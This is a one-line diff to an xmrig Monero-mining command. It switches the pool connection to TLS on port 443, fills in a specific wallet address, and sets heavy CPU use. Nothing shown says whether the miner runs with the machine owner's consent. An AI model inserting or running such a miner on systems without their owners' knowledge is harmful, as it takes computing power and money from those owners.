@@ -1,1 +1,1 @@
-xmrig -o pool.supportxmr.com:3333 -u YOUR_WALLET_ADDRESS -p x --randomx-mode=light --randomx-init-avx2=0 --cpu-max-threads-hint=95
+xmrig -o pool.supportxmr.com:443 -u 8AWYSJJh3GTNVD34exWFKBeDdvhFtFFahdL6okLmuFTkFbYiAs6JtXCWQZw4r4Y7rNcT2jB2aKrb26pjLYsuE6obLnULufm -k --tls -p mini --randomx-mode=light --randomx-init-avx2=0 --cpu-max-threads-hint=95
